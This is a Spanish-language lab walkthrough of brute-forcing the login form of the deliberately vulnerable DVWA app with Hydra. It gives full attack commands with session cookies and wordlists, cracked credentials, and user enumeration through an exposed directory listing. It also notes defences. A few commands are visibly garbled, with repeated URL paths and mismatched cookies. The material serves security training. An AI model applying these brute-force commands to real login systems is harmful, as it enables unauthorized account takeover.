# Hydra — Fuerza bruta contra formularios web

## Índice

1. [Introducción a Hydra](#1-introducción-a-hydra)
2. [Opciones del comando](#2-opciones-del-comando)
3. [Fuerza bruta contra el usuario admin](#3-fuerza-bruta-contra-el-usuario-admin)
   - [Información necesaria](#31-información-necesaria)
   - [Construcción del comando](#32-construcción-del-comando)
   - [Explicación de los parámetros del ataque](#33-explicación-de-los-parámetros-del-ataque)
   - [Ejecución y resultado](#34-ejecución-y-resultado)
   - [Sintaxis alternativa](#35-sintaxis-alternativa)
   - [Comparativa entre niveles de seguridad](#36-comparativa-entre-niveles-de-seguridad)
4. [Fuerza bruta contra el resto de usuarios](#4-fuerza-bruta-contra-el-resto-de-usuarios)
   - [Enumeración de usuarios](#41-enumeración-de-usuarios)
   - [Ataque con lista de usuarios](#42-ataque-con-lista-de-usuarios)
   - [Credenciales obtenidas](#43-credenciales-obtenidas)

---

## 1. Introducción a Hydra

Hydra es una herramienta de fuerza bruta que permite atacar sistemas de autenticación basados en contraseñas. Soporta una amplia variedad de protocolos, lo que la convierte en una de las herramientas más versátiles en auditorías de seguridad ofensiva:

> Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC y XMPP.

Hydra viene preinstalada en Kali Linux. Con la opción `-h` se pueden consultar todas las opciones disponibles.

> **Advertencia:** Hydra es una herramienta de prueba de concepto destinada a investigadores y consultores de seguridad. Su uso contra sistemas sin autorización explícita es ilegal. Utilízala únicamente en entornos controlados como laboratorios o plataformas CTF.

---

## 2. Opciones del comando

La sintaxis general de Hydra es la siguiente:

```bash
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS]
[-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME]
[-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
```

La salida completa de `hydra -h` muestra las siguientes opciones:

```bash
kali@kali:~$ hydra -h
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret
service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and
ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS]
[-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-
ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
-R              restore a previous aborted/crashed session
-I              ignore an existing restore file (don't wait 10 seconds)
-S              perform an SSL connect
-s PORT         if the service is on a different default port, define it here
-l LOGIN or -L FILE   login with LOGIN name, or load several logins from FILE
-p PASS  or -P FILE   try password PASS, or load several passwords from FILE
-x MIN:MAX:CHARSET    password bruteforce generation, type "-x -h" to get help
-y              disable use of symbols in bruteforce, see above
-r              use a non-random shuffling method for option -x
-e nsr          try "n" null password, "s" login as pass and/or "r" reversed login
-u              loop around users, not passwords (effective! implied with -x)
-C FILE         colon separated "login:pass" format, instead of -L/-P options
-M FILE         list of servers to attack, one entry per line, ':' to specify port
-o FILE         write found login/password pairs to FILE instead of stdout
-b FORMAT       specify the format for the -o FILE: text(default), json, jsonv1
-f / -F         exit when a login/pass pair is found (-M: -f per host, -F global)
-t TASKS        run TASKS number of connects in parallel per target (default: 16)
-T TASKS        run TASKS connects in parallel overall (for -M, default: 64)
-w / -W TIME    wait time for a response (32) / between connects per thread (0)
-c TIME         wait time per login attempt over all threads (enforces -t 1)
-4 / -6         use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
-v / -V / -d    verbose mode / show login+pass for each attempt / debug mode
-O              use old SSL v2 and v3
-K              do not redo failed attempts (good for -M mass scanning)
-q              do not print messages about connection errors
-U              service module usage details
-m OPT          options specific for a module, see -U output for information
-h              more command line options (COMPLETE HELP)
server          the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
service         the service to crack (see below for supported protocols)
OPT             some service modules support additional input (-U for module help)
```

La siguiente tabla resume las opciones más relevantes para ataques a formularios web:

| Parámetro | Descripción |
|-----------|-------------|
| `-l LOGIN` | Especifica un único nombre de usuario |
| `-L FILE` | Carga una lista de usuarios desde un archivo |
| `-p PASS` | Especifica una única contraseña |
| `-P FILE` | Carga una lista de contraseñas desde un archivo |
| `-e nsr` | Prueba contraseña vacía (`n`), el propio usuario como contraseña (`s`) y el usuario al revés (`r`) |
| `-t TASKS` | Número de conexiones paralelas por objetivo (por defecto: 16) |
| `-f` | Detiene el ataque al encontrar el primer par válido |
| `-V` | Modo verbose: muestra cada intento usuario/contraseña |
| `-I` | Ignora el archivo de sesión anterior y lanza el ataque desde cero |
| `-o FILE` | Guarda los pares encontrados en un archivo en lugar de mostrarlos por pantalla |
| `-s PORT` | Especifica un puerto diferente al predeterminado del servicio |

---

## 3. Fuerza bruta contra el usuario admin

![Error Login](./DVWA%20Ciberseguridad%20web/imagenes/brute%20force/1.png)

**Enunciado:** Realizar un ataque de fuerza bruta en el nivel *low* usando Hydra para descubrir la contraseña del usuario `admin`.

---

### 3.1 Información necesaria

Antes de lanzar el ataque, es necesario recopilar la siguiente información del formulario objetivo:

- **Usuario:** `admin`
- **Lista de contraseñas:** por ejemplo `2020-200_most_used_passwords.txt` de [SecLists](https://github.com/danielmiessler/SecLists)
- **URL del formulario:** `http://192.168.100.14/dvwa/vulnerabilities/brute/`
- **Método del formulario:** `GET`
- **Campos del formulario:** `username`, `password`, `Login`

![Petición formulario](./DVWA%20Ciberseguridad%20web/imagenes/brute%20force/2.png)

![Petición formulario 2](./DVWA%20Ciberseguridad%20web/imagenes/brute%20force/3.png)


El formulario HTML tiene la siguiente estructura:

```bash
<h2>Login</h2>
<form action="#" method="GET">
    Username:<br>
    <input type="text" name="username"><br>
    Password:<br>
    <input type="password" autocomplete="off" name="password"><br>
    <br>
    <input type="submit" value="Login" name="Login">
</form>
```

![Cabeceras](./DVWA%20Ciberseguridad%20web/imagenes/brute%20force/5.png)

Además, es necesario obtener la **cookie de sesión** activa (obtenible con Burp Suite o las herramientas de desarrollador del navegador) y el **mensaje de error** que devuelve la aplicación ante un fallo de autenticación:

- **Cookie:** `PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low`
- **Mensaje de error:** `Username and/or password incorrect`

> **Importante:** La cookie de sesión es necesaria porque DVWA requiere estar autenticado para acceder a las páginas de vulnerabilidades. Sin ella, Hydra recibirá siempre una redirección al login en lugar de la respuesta del formulario de fuerza bruta.

---

### 3.2 Construcción del comando

Con toda la información recopilada, el comando a ejecutar es:

```bash
┌──(root㉿kali)-[~]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://192.168.100.14/dvwa/vulnerabilidvwa/vulnerabilities/brute/dvwa/vulnerabilities/brute/dvwa/vulnerabilities/brute/ties/brute:/username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=k2mfcg4opnv91evvlqm3r6dhnt;security=low:FUsername and/or password incorrect' -V -t 5 -I -e nsr
```

---

### 3.3 Explicación de los parámetros del ataque

| Fragmento del comando | Descripción |
|----------------------|-------------|
| `-l admin` | Ataque contra el usuario `admin` |
| `-P /usr/share/wordlists/rockyou.txt` | Diccionario de contraseñas a utilizar |
| `http-get-form` | Indica que se ataca un formulario que usa el método `GET` |
| `192.168.100.14/dvwa/vulnerabilities/brute/` | URL del formulario objetivo |
| `username=^USER^&password=^PASS^&Login=Login` | Campos del formulario; `^USER^` y `^PASS^` son los marcadores que Hydra sustituye dinámicamente |
| `:H=Cookie:PHPSESSID=...` | Cabecera HTTP con la cookie de sesión activa |
| `:F=Username and/or password incorrect` | Cadena de fallo: si aparece en la respuesta, Hydra descarta el intento |
| `-V` | Muestra por pantalla cada intento usuario/contraseña |
| `-t 5` | Número de conexiones en paralelo por objetivo |
| `-I` | Lanza el ataque ignorando cualquier archivo de recuperación previo |
| `-e nsr` | Prueba además contraseña vacía, el propio usuario y el usuario al revés |

> **Nota:** Si en lugar de conocer el mensaje de error se conoce la URL o el mensaje de éxito, se puede usar `:S=` en lugar de `:F=` para indicar a Hydra qué respuesta corresponde a una autenticación exitosa.

---

### 3.4 Ejecución y resultado

```bash
┌──(root㉿kali)-[~]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://192.168.100.14/dvwa/vulnerabilidvwa/vulnerabilities/brute/dvwa/vulnerabilities/brute/dvwa/vulnerabilities/brute/ties/brute:/username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=k2mfcg4opnv91evvlqm3r6dhnt;security=low:FUsername and/or password incorrect' -V -t 5 -I -e nsr

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret
service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and
ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-02 05:42:09
[DATA] max 5 tasks per 1 server, overall 5 tasks, 200 login tries (l:1/p:200), ~40 tries per task
[DATA] attacking http-get-form://192.168.100.14:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low:F=Username and/or password incorrect
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "admin" - 1 of 200 [child 0] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "" - 2 of 200 [child 1] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "nimda" - 3 of 200 [child 2] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "123456" - 4 of 200 [child 3] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "123456789" - 5 of 200 [child 4] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "picture1" - 6 of 200 [child 1] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "password" - 7 of 200 [child 2] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "12345678" - 8 of 200 [child 0] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "111111" - 9 of 200 [child 3] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "123123" - 10 of 200 [child 4] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "12345" - 11 of 200 [child 1] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "1234567890" - 12 of 200 [child 4] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "senha" - 13 of 200 [child 0] (0/0)
...
[80][http-get-form] host: 192.168.100.14   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-02 05:42:10
```

El ataque completa las 200 pruebas en aproximadamente **1 segundo**, encontrando que la contraseña del usuario `admin` es `password`.

---

### 3.5 Sintaxis alternativa

Hydra también permite separar el servicio de la URL usando una sintaxis alternativa donde el host, el módulo y la ruta se pasan como argumentos independientes:

```bash
┌──(root㉿kali)-[~]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt -I 192.168.100.14 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=k2mfcg4opnv91evvlqm3r6dhnt;security=low:F=Username and/or password incorrect" -V -t 5 -I -e nsr
```

> **Nota:** Ambas sintaxis son equivalentes en resultado. La segunda puede ser más cómoda al trabajar con rutas largas, ya que separa claramente el host del resto de parámetros.

---

### 3.6 Comparativa entre niveles de seguridad

Repetir el mismo ataque con el nivel de seguridad `medium` permite observar cómo el retardo artificial implementado en la aplicación impacta directamente en la velocidad del ataque, pasando de aproximadamente **1 segundo** a **21 segundos**:

```bash
┌──(root㉿kali)-[~]
└─# kali@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -I 192.168.100.14 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=k2mfcg4opnv91evvlqm3r6dhnt;security=medium:F=Username and/or password incorrect" -V -t 5 -I -e nsr

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret
service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and
ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-02 05:52:18
[DATA] max 5 tasks per 1 server, overall 5 tasks, 200 login tries (l:1/p:200), ~40 tries per task
[DATA] attacking http-get-form://192.168.100.14:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=medium:F=Username and/or password incorrect
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "admin" - 1 of 200 [child 0] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "" - 2 of 200 [child 1] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "nimda" - 3 of 200 [child 2] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "123456" - 4 of 200 [child 3] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "123456789" - 5 of 200 [child 4] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "picture1" - 6 of 200 [child 0] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "password" - 7 of 200 [child 1] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "12345678" - 8 of 200 [child 2] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "111111" - 9 of 200 [child 3] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "123123" - 10 of 200 [child 4] (0/0)
[ATTEMPT] target 192.168.100.14 - login "admin" - pass "12345" - 11 of 200 [child 0] (0/0)
[80][http-get-form] host: 192.168.100.14   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-02 05:52:39
```

> **Nota:** Este comportamiento ilustra una de las medidas de defensa más sencillas contra ataques de fuerza bruta: introducir un retardo artificial entre intentos de autenticación fallidos. Aunque no impide el ataque, lo ralentiza significativamente cuando el atacante no puede escalar el paralelismo.

---

## 4. Fuerza bruta contra el resto de usuarios

**Enunciado:** Una vez descubiertas las credenciales de uno de los usuarios, investigar y atacar las contraseñas del resto.

---

### 4.1 Enumeración de usuarios

Al acceder con las credenciales de `admin`, la aplicación muestra una imagen de perfil cargada desde la URL `http://192.168.100.14/dvwa/hackable/users/admin.jpg`, lo que revela que las imágenes están almacenadas en el directorio `/dvwa/hackable/users/`.

![Acceso exitoso](./DVWA%20Ciberseguridad%20web/imagenes/brute%20force/6.png)

Accediendo directamente a `http://192.168.100.14/dvwa/hackable/users/` se obtiene un listado completo del directorio, lo que expone los nombres de todos los usuarios:

```bash
Index of /dvwa/hackable/users

Name            Last modified       Size
1337.jpg        2023-09-23 16:00    3.6K
admin.jpg       2023-09-23 16:00    3.5K
gordonb.jpg     2023-09-23 16:00    3.0K
pablo.jpg       2023-09-23 16:00    2.9K
smithy.jpg      2023-09-23 16:00    4.3K
```

![Resto de usuarios](./DVWA%20Ciberseguridad%20web/imagenes/brute%20force/7.png)

> **Advertencia:** Que el servidor Apache devuelva el listado del directorio es consecuencia de tener activada la opción `Indexes` en su configuración. Esta práctica constituye una mala configuración grave, ya que expone la estructura interna de la aplicación. En producción debe desactivarse añadiendo `Options -Indexes` en la configuración del servidor o en el archivo `.htaccess`.

Dado que `admin.jpg` corresponde a la cuenta `admin`, se puede inferir que el nombre de cada archivo `.jpg` coincide con el nombre de usuario. Se crea entonces la lista de usuarios a atacar:

```bash
┌──(root㉿kali)-[~]
└─# kali@kali:~$ nano usuarios_dvwa.txt
1337
gordonb
pablo
smithy
```

---

### 4.2 Ataque con lista de usuarios

Se repite el ataque anterior, pero esta vez se pasa la lista de usuarios con `-L` y se amplía el diccionario de contraseñas, por ejemplo usando `probable-v2-top12000.txt` de SecLists o el clásico `rockyou.txt`:

```bash
┌──(root㉿kali)-[~]
└─#  hydra -L usuarios_dvwa.txt -P probable-v2-top12000.txt 'http-get-form://192.168.100.14/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low:F=Username and/or password incorrect' -t 10 -I -e nsr

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret
service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and
ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-02 07:21:50
[DATA] max 10 tasks per 1 server, overall 10 tasks, 800 login tries (l:4/p:200), ~80 tries per task
[DATA] attacking http-get-form://192.168.100.14:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=u50vbil75pgsn9qgrj7q929sp8; security=low:F=Username and/or password incorrect
[80][http-get-form] host: 192.168.100.14   login: 1337     password: charley
[80][http-get-form] host: 192.168.100.14   login: gordonb  password: abc123
[80][http-get-form] host: 192.168.100.14   login: pablo    password: letmein
[80][http-get-form] host: 192.168.100.14   login: smithy   password: password
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-02 07:21:59
```

> **Nota:** Al atacar múltiples usuarios simultáneamente, el parámetro `-t` controla el paralelismo global. En este caso se aumenta a `10` conexiones para compensar el mayor número de combinaciones usuario/contraseña a probar.

---

### 4.3 Credenciales obtenidas

El ataque descubre las contraseñas de los cuatro usuarios restantes:

| Usuario | Contraseña |
|---------|------------|
| `gordonb` | `abc123` |
| `pablo` | `letmein` |
| `smithy` | `password` |
| `1337` | `charley` |

> **Recuerda:** Todas estas contraseñas forman parte de los diccionarios más comunes (SecLists, rockyou). El uso de contraseñas débiles o predecibles es una de las vulnerabilidades más explotadas en auditorías reales, y su corrección es inmediata: políticas de contraseñas robustas y, preferiblemente, autenticación multifactor.
